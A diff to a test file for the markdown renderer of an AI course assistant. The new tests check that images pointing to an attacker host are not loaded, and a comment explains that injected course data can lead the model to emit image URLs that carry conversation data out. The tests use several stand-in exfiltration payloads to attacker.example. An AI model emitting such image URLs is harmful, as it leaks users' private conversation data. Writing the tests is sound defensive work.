@@ -61,10 +61,32 @@ describe('SafeMarkdown', () => {
 
     // Cora's context includes third-party course data, so injected text can make the model emit an image whose URL
     // carries data from the conversation; rendering it makes the browser send that data to any host automatically.
-    it.fails('KNOWN BUG (B29): does not load images from arbitrary hosts in answers (data exfiltration)', () => {
+    it('does not load images from arbitrary hosts in answers (data exfiltration)', () => {
       const { container } = render('Here you go ![chart](https://attacker.example/pixel?d=my%20question)')
       const sources = [...container.querySelectorAll('img')].map(img => img.getAttribute('src'))
       expect(sources.filter(src => src?.includes('attacker.example'))).toEqual([])
+    })
+
+    it.each([
+      ['an inline image', '![chart](https://attacker.example/a.png?d=secret)'],
+      ['a reference-style image', '![chart][pixel]\n\n[pixel]: https://attacker.example/a.png?d=secret'],
+      ['an image with a title', '![chart](https://attacker.example/a.png?d=secret "Chart")'],
+      ['an image inside a link', '[![chart](https://attacker.example/a.png?d=secret)](https://www.coursera.org/learn/python)'],
+      ['an image without alt text', '![](https://attacker.example/a.png?d=secret)'],
+    ])('renders no <img> for %s, and the URL appears nowhere in the page', (_label, markdown) => {
+      const { container } = render(markdown)
+      expect(container.querySelector('img')).toBeNull()
+      expect(container.innerHTML).not.toContain('attacker.example')
+    })
+
+    it("shows an image's alt text instead, so the answer still reads", () => {
+      render('Progress: ![chart of the learning path](https://attacker.example/a.png)')
+      expect(screen.getByText('chart of the learning path')).toBeInTheDocument()
+    })
+
+    it('keeps the link around an image (course links are the point of an answer)', () => {
+      render('[![Python](https://attacker.example/a.png)](https://www.coursera.org/learn/python)')
+      expect(screen.getByRole('link', { name: 'Python' })).toHaveAttribute('href', 'https://www.coursera.org/learn/python')
     })
 
     it('renders an empty answer without crashing', () => {
